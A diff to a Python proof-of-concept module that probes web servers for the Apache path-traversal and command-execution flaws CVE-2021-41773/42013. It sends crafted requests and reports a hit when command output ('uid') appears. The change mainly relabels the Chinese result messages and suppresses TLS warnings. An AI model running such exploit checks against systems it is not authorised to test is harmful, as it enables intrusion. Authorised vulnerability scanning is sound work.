@@ -1,6 +1,10 @@
 import pocs
 import urllib.request
 import ssl
+import urllib3
+from colorama import init
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+init(autoreset=False) 
 
 class POC(pocs.Pocs):
 
@@ -79,11 +83,11 @@ class POC(pocs.Pocs):
             request2 = urllib.request.Request(url=url,headers=head,data=data2.encode('utf-8'))
             response2 = urllib.request.urlopen(request2,context=context)
             if 'uid' in response1.read().decode('utf-8') :
-                msg += '存在CVE-2021-41773任意命令执行漏洞 ' + url +' payload为 ' + data1
+                msg += '存在CVE-2021-42013路径穿越及命令执⾏漏洞 ' + url +' payload为 ' + data1
             elif 'uid' in response2.read().decode('utf-8'):
-                msg += '存在CVE-2021-41773任意命令执行漏洞 ' + url +' payload为 ' + data2
+                msg += '存在CVE-2021-42013路径穿越及命令执⾏漏洞 ' + url +' payload为 ' + data2
             else:
-                msg += '[-] 不存在CVE-2021-41773任意命令执行漏洞' + url
+                msg += '[-] 不存在CVE-2021-42013路径穿越及命令执⾏漏洞' + url
             return msg
         except:
             return '[-] error! 目标网站无法正常访问！'
